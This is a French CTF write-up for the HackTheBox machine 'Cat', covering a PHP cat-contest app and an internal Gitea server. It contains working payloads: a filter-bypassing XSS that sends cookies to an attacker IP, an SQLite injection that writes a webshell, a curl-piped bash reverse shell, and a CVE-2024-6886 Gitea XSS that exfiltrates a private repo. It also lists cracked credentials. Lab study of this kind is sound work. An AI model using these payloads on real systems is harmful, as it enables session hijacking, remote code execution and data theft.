---
tags:
  - HTB
  - WriteUp
  - Linux
  - Medium
  - XSS
  - SQLi
  - SQLite
  - Gitea
  - CVE-2024-6886
  - CookieHijacking
  - CodeReview
  - GitDumper
date: 2026-07-10
platform: HackTheBox
difficulty: Medium
os: Linux (Ubuntu 20.04)
status: Pwned
ip: 10.129.231.253
---

# HTB — Cat

## Informations

| Champ | Valeur |
|---|---|
| Plateforme | HackTheBox |
| Difficulté | Medium |
| OS | Linux (Ubuntu 20.04.6 LTS) |
| Kernel | 5.4.0-204-generic |
| IP cible | `10.129.231.253` |
| Auteur | FisMatHack |
| Date | 2026-07-10 |

---

## Vue d'ensemble

La machine expose SSH (22) et Apache (80) avec une application PHP custom "Best Cat Competition". Un repo `.git` exposé permet de récupérer le source code et d'identifier un **Stored XSS** dans le champ `cat_name` de `contest.php` qui bypass un filtre via HTML hex encoding + `onerror` event. Le cookie admin volé donne accès à `accept_cat.php` qui contient une **SQLi directe** dans un `INSERT` sur SQLite, exploitée pour écrire un **webshell via `ATTACH DATABASE`**. L'accès www-data permet de dumper la DB (hash MD5 de rosa → `soyunaprincesarosa`), puis les logs Apache (groupe `adm`) révèlent le mot de passe d'axel en clair (login GET). Un tunnel SSH vers Gitea 1.22.0 interne et l'exploitation de **CVE-2024-6886** (Stored XSS dans la description de repo) permet d'exfiltrer le contenu d'un repo privé contenant les credentials root.

---

## Outils utilisés

| Outil | Usage |
|---|---|
| `nmap` | Scan de ports + script `http-git` pour détecter le `.git` exposé |
| `ffuf` | Brute-force de répertoires web |
| `git-dumper` | Dump du repo `.git` exposé pour récupérer le source PHP |
| `grep` | Audit de code source (recherche de `$_POST`, `$_GET`, requêtes SQL non préparées) |
| Burp Suite | Interception de requêtes, injection de payloads XSS, envoi de requêtes POST |
| CyberChef | Encoding HTML hex des payloads XSS pour bypass de filtre |
| `curl` | Tests manuels de webshell, validation d'oracle, requêtes API Gitea |
| `python3 -m http.server` | Listener HTTP pour recevoir les cookies volés et les données exfiltrées |
| `nc` (netcat) | Listener pour reverse shell |
| `hashcat` | Crack de hash MD5 (`-m 0`) |
| `searchsploit` | Recherche d'exploits pour Gitea 1.22.0 |
| `sqlite3` | Interrogation directe de la base SQLite sur la cible |
| `sendmail` | Envoi d'email au bot jobert pour déclencher le XSS Gitea |
| `ssh -L` | Port forwarding local pour accéder à Gitea interne |
| `ImageMagick` (`convert`) | Création d'image minimale pour l'upload |

---

## 1. Énumération

### Nmap

```bash
nmap -Pn -A --top-ports 1000 cat.htb
```

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
| 80 | HTTP | Apache 2.4.41 (Ubuntu) |

Point clé : le script `http-git` détecte un repo `.git` exposé :

```bash
nmap -p 80 --script http-git cat.htb
```

```
http-git:
  10.129.231.253:80/.git/
    Git repository found!
    Last commit message: Cat v1
```

### /etc/hosts

```bash
echo "10.129.231.253 cat.htb" | sudo tee -a /etc/hosts
```

> Important : le virtual hosting Apache nécessite que `cat.htb` soit résolu. Sans cette entrée, ffuf et nmap sur le hostname échouent car le header `Host:` ne contient pas `cat.htb`.

### ffuf

```bash
ffuf -u "http://cat.htb/FUZZ" -w /opt/lists/seclists/Discovery/Web-Content/common.txt -t 50 -mc 200,301,302,403 -ic
```

Résultats intéressants :
- `/.git/HEAD` → repo git exposé
- `/admin.php` → panel admin (302 redirect)
- `/index.php` → page principale

### Git Dumper — Récupération du source code

```bash
git-dumper http://cat.htb/.git/ ./cat-source
```

`git-dumper` reconstruit le repo complet depuis un `.git` exposé. Il télécharge tous les objets git accessibles et reconstitue les fichiers source.

---

## 2. Audit de code source (Code Review)

### Méthodologie

Recherche systématique des entrées utilisateur non sanitisées :

```bash
# Fichiers qui traitent des entrées utilisateur
grep -r "\$_POST\|\$_GET" . --include="*.php" -l

# Variables injectées dans des requêtes SQL
grep -n "query\|SELECT\|INSERT\|WHERE" ./join.php ./contest.php ./view_cat.php

# Variables affichées sans htmlspecialchars
grep -n "echo \$cat" ./view_cat.php ./admin.php
```

### Résultats de l'audit

**join.php** — Login/Register via GET (credentials en clair dans les logs Apache) :
```php
$username = $_GET['username'];
$password = md5($_GET['password']);
// → Requêtes préparées (PDO), pas de SQLi
// → MAIS les credentials apparaissent dans access.log car GET
```

**contest.php** — Upload de chat avec filtre de caractères :
```php
$cat_name = $_POST['cat_name'];
$forbidden_patterns = "/[+*{}',;<>()\\[\\]\\/\\:]/";
// → Filtre blacklist, mais `"` et `=` ne sont PAS filtrés
// → cat_name stocké en DB via prepared statement
```

**view_cat.php** — Affichage SANS htmlspecialchars (XSS sink) :
```php
<img src="<?php echo $cat['photo_path']; ?>" alt="<?php echo $cat['cat_name']; ?>" class="cat-photo">
// → Aucun htmlspecialchars() → Stored XSS possible via cat_name
```

**admin.php** — Affichage AVEC htmlspecialchars (protégé) :
```php
<img src="<?php echo htmlspecialchars($cat['photo_path']); ?>" alt="<?php echo htmlspecialchars($cat['cat_name']); ?>">
// → Protégé, pas exploitable directement
```

**accept_cat.php** — SQLi directe (injection sink) :
```php
$cat_name = $_POST['catName'];
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
$pdo->exec($sql_insert);
// → Concaténation directe, pas de prepared statement → SQLi
// → MAIS accessible uniquement par l'admin axel
```

**config.php** — Base SQLite :
```php
$db_file = '/databases/cat.db';
$pdo = new PDO("sqlite:$db_file");
```

### Chaîne d'attaque identifiée

```
Stored XSS (contest.php → view_cat.php)
    → Cookie hijacking (session axel)
        → SQLi dans accept_cat.php (en tant qu'axel)
            → Webshell via ATTACH DATABASE (SQLite)
                → RCE
```

---

## 3. Stored XSS — Cookie Hijacking

### Le défi : bypass du filtre de contest.php

Caractères bloqués : `+ * { } ' , ; < > ( ) [ ] / \ :`

Caractères autorisés : `"` `=` `` ` `` `#` `&` `x`

### Technique : HTML Hex Entity Encoding sans `;`

Le filtre PHP vérifie les caractères bruts dans `$_POST['cat_name']`. Mais les **entités HTML hex** (`&#x28` pour `(`) ne contiennent aucun caractère blacklisté et sont décodées par le navigateur au moment du rendu.

Le `;` final des entités HTML (`&#x28;`) est dans la blacklist, mais les navigateurs interprètent les entités HTML **avec ou sans le `;` terminal**.

### Payload JS original

```javascript
fetch('http://10.10.16.248:8000/?cookie='+document.cookie)
```

### Encoding avec CyberChef

1. Coller le JS dans Input
2. Recette : **To HTML Entity** → Hex entities → Convert all characters
3. Supprimer tous les `;` du résultat

### Payload final pour cat_name

```
x" onerror="&#x66&#x65&#x74&#x63&#x68&#x28&#x27&#x68&#x74&#x74&#x70&#x3a&#x2f&#x2f&#x31&#x30&#x2e&#x31&#x30&#x2e&#x31&#x36&#x2e&#x32&#x34&#x38&#x3a&#x38&#x30&#x30&#x30&#x2f&#x3f&#x63&#x6f&#x6f&#x6b&#x69&#x65&#x3d&#x27&#x2b&#x64&#x6f&#x63&#x75&#x6d&#x65&#x6e&#x74&#x2e&#x63&#x6f&#x6f&#x6b&#x69&#x65&#x29" x="
```

Ce que ça génère dans `view_cat.php` :

```html
<img src="uploads/..." alt="x" onerror="fetch('http://...')" x="" class="cat-photo">
```

### Corruption de l'image

Pour que `onerror` se déclenche, l'image doit **échouer à charger**. On envoie un faux GIF :

```
GIF89a;
test
```

`GIF89a` sont les magic bytes GIF → `getimagesize()` retourne `true` (upload accepté). Mais le navigateur ne peut pas afficher ce fichier corrompu → `onerror` se déclenche.

### Exécution

```bash
# Listener
python3 -m http.server 8000

# Résultat reçu
10.129.231.253 - - "GET /?cookie=PHPSESSID=ds0r5c7u148v0o44rrqrt6985g HTTP/1.1" 200 -
```

---

## 4. SQL Injection → Webshell (accept_cat.php)

### Contexte

Avec le cookie d'axel, on a accès à `accept_cat.php`. La requête vulnérable :

```php
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
$pdo->exec($sql_insert);
```

`$cat_name` est concaténé directement. `exec()` de PDO SQLite accepte **plusieurs instructions** séparées par `;`.

### Technique : ATTACH DATABASE (SQLite → fichier PHP)

SQLite permet de créer une base de données dans **n'importe quel fichier** sur le disque. En ciblant un fichier dans le webroot Apache, on crée un fichier interprétable par PHP.

### Payload SQLi

```sql
x');ATTACH DATABASE '/var/www/cat.htb/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

### Envoi via Burp (URL-encodé)

```
POST /accept_cat.php HTTP/1.1
Host: cat.htb
Cookie: PHPSESSID=<cookie_axel>
Content-Type: application/x-www-form-urlencoded

catName=x')%3bATTACH+DATABASE+'/var/www/cat.htb/lol.php'+AS+lol%3b+CREATE+TABLE+lol.pwn+(dataz+text)%3b+INSERT+INTO+lol.pwn+(dataz)+VALUES+("<%3fphp+system($_GET['cmd'])%3b+%3f>")%3b--&catId=1
```

### Résultat

Le fichier `lol.php` contient du binaire SQLite + le payload PHP en clair :

```
SQLite format 3....[binary]....<?php system($_GET['cmd']); ?>...[binary]
```

PHP ignore tout ce qui n'est pas entre `<?php ?>` et exécute la commande.

```bash
curl "http://cat.htb/lol.php?cmd=whoami"
# → www-data
```

### Webshell → Reverse shell

```bash
# Sur Exegol : créer le script
echo 'bash -i >& /dev/tcp/10.10.16.248/4444 0>&1' > /workspace/shell.sh
python3 -m http.server 8000

# Listener
nc -lvnp 4444

# Déclencher via le webshell
http://cat.htb/lol.php?cmd=curl+http://10.10.16.248:8000/shell.sh|bash
```

---

## 5. Post-Exploitation — Mouvement latéral

### Dump de la base SQLite

```bash
sqlite3 /databases/cat.db "SELECT username,password FROM users"
```

| Username | Hash MD5 |
|---|---|
| axel | d1bbba3670feb9435c9841e46e60ee2f |
| rosa | ac369922d560f17d6eeb8b2c7dec498c |
| jobert | 88e4dceccd48820cf77b5cf6c08698ad |

### Crack des hashs MD5

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Résultat : `rosa` → `soyunaprincesarosa`

### Pivot vers rosa (groupe adm)

```bash
ssh rosa@10.129.231.253
# password: soyunaprincesarosa

id
# rosa adm  ← groupe adm = lecture des logs Apache
```

### Extraction du mot de passe d'axel dans les logs

Le login de l'application utilise **GET** (pas POST), donc les credentials apparaissent en clair dans les logs Apache :

```bash
grep 'loginPassword' /var/log/apache2/access.log
```

```
"GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1"
```

### Accès SSH axel → User flag

```bash
ssh axel@10.129.231.253
# password: aNdZwgC4tI9gnVXv_e3Q

cat ~/user.txt
```

---

## 6. Privilege Escalation — CVE-2024-6886 (Gitea XSS)

### Découverte de Gitea interne

```bash
# Ports internes
ss -tlnp | grep LISTEN
# → 3000/tcp Gitea

# Version
curl http://localhost:3000/api/v1/version
# → {"version":"1.22.0"}
```

Mail dans `/var/mail/axel` de rosa mentionnant :
- Un repo privé `administrator/Employee-management` sur Gitea
- Instruction d'envoyer un email à `jobert@localhost` avec un lien de repo

### CVE-2024-6886 — Stored XSS dans Gitea 1.22.0

| Champ | Valeur |
|---|---|
| CVE | CVE-2024-6886 |
| Type | Stored XSS |
| CVSS 4.0 | 10.0 CRITICAL |
| Version affectée | Gitea 1.22.0 |
| Fix | Gitea 1.22.1 |
| Vecteur | Champ Description d'un repository |

La description d'un repo Gitea n'est pas correctement sanitisée — on peut injecter du HTML/JS via une balise `<a href="javascript:...">`.

### Tunnel SSH pour accéder à Gitea

```bash
ssh -L 3000:127.0.0.1:3000 axel@10.129.231.253
```

`-L 3000:127.0.0.1:3000` redirige le port local 3000 vers le port 3000 interne de la cible via SSH.

### Exploitation

1. Se connecter à Gitea (`http://localhost:3000`) avec `axel` / `aNdZwgC4tI9gnVXv_e3Q`

2. Créer un repo public avec un README

3. Dans **Settings → Description**, injecter le payload XSS :

```html
<a href="javascript:var req = new XMLHttpRequest();req.open('GET','http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php',false);req.send();var req2 = new XMLHttpRequest();req2.open('GET','http://10.10.16.248:8000/?content=' + btoa(req.responseText),true);req2.send();">Click</a>
```

Ce que fait le payload :
- `req` — fetch `index.php` du repo privé (jobert y a accès)
- `btoa(req.responseText)` — encode le contenu en base64
- `req2` — envoie le base64 vers notre serveur HTTP

4. Envoyer l'email au bot jobert :

```bash
echo "http://localhost:3000/axel/repo" | sendmail jobert
```

5. Décoder la réponse :

```bash
echo "PD9waHAK..." | base64 -d
```

```php
<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';
```

### Root

```bash
su root
# password: IKw75eR0MR7CMIxhH0

cat /root/root.txt
# f3683493b558b666ba7fd30cf48734cc
```

---

## 7. Résumé de la chaîne d'exploitation

```
.git exposé → git-dumper → source code review
    └─► Stored XSS dans cat_name (contest.php → view_cat.php)
        ├─► Bypass filtre via HTML hex encoding sans ;
        ├─► onerror sur image corrompue (GIF89a magic bytes)
        └─► Cookie hijacking → session axel
                └─► SQLi dans accept_cat.php (INSERT sans prepared stmt)
                    └─► ATTACH DATABASE → webshell PHP dans webroot
                        └─► RCE (www-data)
                            └─► sqlite3 dump → hash MD5 rosa → crack
                                └─► rosa (groupe adm) → logs Apache
                                    └─► Mot de passe axel en clair (GET login)
                                        └─► SSH axel → user.txt
                                            └─► Tunnel SSH → Gitea 1.22.0
                                                └─► CVE-2024-6886 (Stored XSS description)
                                                    └─► Exfiltration repo privé
                                                        └─► Credentials root → root.txt
```

---

## 8. CVEs et références

| CVE | Description | CVSS |
|---|---|---|
| CVE-2024-6886 | Gitea 1.22.0 Stored XSS via repo description | 10.0 Critical |

- [CVE-2024-6886 NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-6886)
- [EDB-52077 Gitea XSS PoC](https://www.exploit-db.com/exploits/52077)
- [Gitea 1.22.1 Release (fix)](https://blog.gitea.com/release-of-1.22.1)
- [PayloadsAllTheThings — SQLite Injection RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sqlite-injection)

---

## 9. Techniques et concepts clés

### Stored XSS avec bypass de filtre

La blacklist de `contest.php` bloquait `' ( ) ; / < >` mais pas `"` ni `=`. Le contournement utilise :
- `"` pour casser l'attribut HTML `alt=""`
- `onerror` comme event handler (pas besoin de `<script>`)
- **HTML hex entities sans `;`** (`&#x28` au lieu de `(`) — le filtre PHP voit du texte normal, le navigateur décode avant exécution JS
- **Image corrompue** (GIF89a magic bytes) pour déclencher `onerror`

### SQLi sur SQLite → RCE via ATTACH DATABASE

SQLite permet via `ATTACH DATABASE` de créer un fichier `.php` dans le webroot contenant du code PHP injecté comme donnée dans une table. Le parser PHP ignore le binaire SQLite et exécute le code entre `<?php ?>`.

### GET vs POST pour l'authentification

Le formulaire de login utilise GET → les credentials apparaissent dans l'URL → loggés dans `access.log`. Le groupe `adm` (rosa) permet de lire ces logs.

### SSH Local Port Forwarding

`ssh -L 3000:127.0.0.1:3000` crée un tunnel chiffré qui rend un service interne accessible localement — indispensable pour les services non exposés en pentest.

### XSS dans Gitea pour exfiltration de données privées

La CVE-2024-6886 permet d'injecter du JS via la description d'un repo. Combiné avec un bot qui visite les repos (jobert), on peut exécuter du JS dans le contexte d'un utilisateur privilégié pour lire des repos privés et exfiltrer leur contenu via XMLHttpRequest + base64.

---

## 10. Leçons retenues

- **Le code review avant l'exploitation** est la clé sur les boxes medium — identifier les sinks (echo sans htmlspecialchars, SQL sans prepare) et les sources (POST/GET) permet de cartographier la chaîne d'attaque complète avant de tirer un seul payload.
- **Les blacklists de caractères sont contournables** — HTML hex encoding, Unicode, double encoding... une whitelist est toujours préférable.
- **`getimagesize()` n'est pas une validation d'image robuste** — les magic bytes suffisent à la tromper.
- **Les logins GET sont une faille de sécurité** — les credentials finissent dans les logs serveur, l'historique du navigateur, les proxies, etc.
- **Les services internes sont aussi des surfaces d'attaque** — Gitea sur localhost:3000 n'était pas accessible de l'extérieur mais reste vulnérable une fois qu'on a un accès SSH.
- **Les bots/cron jobs sont des vecteurs XSS** — sur les boxes HTB, un bot qui visite périodiquement les pages simule un vrai utilisateur qui clique sur des liens malveillants.
